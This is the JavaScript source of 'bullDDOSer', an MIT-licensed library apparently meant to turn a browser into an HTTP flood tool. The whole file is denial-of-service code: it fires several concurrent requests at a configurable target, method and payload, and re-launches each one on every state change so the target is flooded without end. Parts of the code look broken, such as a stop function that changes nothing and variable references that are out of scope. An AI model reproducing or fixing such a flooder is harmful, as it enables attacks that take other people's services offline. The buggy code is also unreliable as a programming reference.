/*!
bullddoser.js - v0.0.0
Created by Gonçalo Sá on 2015-08-17.

git://github.com/GNSPS/bullDDOSer.git

The MIT License (MIT)

Copyright (c) 2015 Gonçalo Sá

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
the Software, and to permit persons to whom the Software is furnished to do so,
subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. 
*/

(function universalModuleDefinition(root, factory) {
    "use strict";

    if(typeof exports === 'object' && typeof module === 'object') {
        // Node module exports
        module.exports = factory();
    }
    else if(typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define([], factory);
    }
    else if(typeof exports === 'object') {
        // CommonJS style that does not support module.exports
        exports['bullddoser'] = factory();
    }
    else {
        // Global
        root['bullddoser'] = factory();
    }
}(this, function (target, method, data) {
    "use strict";
    
    function _config(target, method, data) {
        /*jshint validthis: true */
        if (typeof target !== "string") {
            console.error("bullDDOSer: Invalid target argument. No change.");
        }
        else {
            this.target = target;
        }
        if (typeof method !== "string") {
            console.error("bullDDOSer: Invalid method argument. No change.");
        }
        else {
            this.method = method;
        }
        if (typeof data !== "string") {
            throw new Error("bullDDOSer: Invalid data argument. No change.");
        }
        else {
            this.data = data;
        }
    }
    
    function _init() {
        /*jshint validthis: true */
        if (typeof this.target !== "string") {
            throw new Error("bullDDOSer: Invalid target argument.");
        }
        if (typeof this.method !== "string") {
            console.error("bullDDOSer: Invalid method argument.");
            this.method = "GET";
        }
        if (typeof this.data !== "string") {
            console.error("bullDDOSer: Invalid data argument.");
            this.data = "";
        }
    }
    
    function Bull() {
        /*jshint validthis: true */
        var bullfighterWins = false;
        
        function Charge(method, target, data) {
            /*jshint validthis: true */
            var http = new XMLHttpRequest(); 

            http.open(method, target, true); 

            http.onreadystatechange = this.bullfighterWins ? function(){} : new Charge(method, target, data);

            http.send((!data.length && method === "POST") ? null : data);
        }
        
        function start() {
            var bullfighterWins = false;
            
            for(var i = 0; i < browserCap; i++) {
                new Charge(this.method, this.target, this.data);
            }
        }
        
        function stop() {
            var bullfighterWins = true;
        }
    }
    
    Bull.browserCap = 6;
    
    _init(target, method, data);
    
    return {
        config: _config,
        create: function() {
            return new Bull();
        }
    };
}));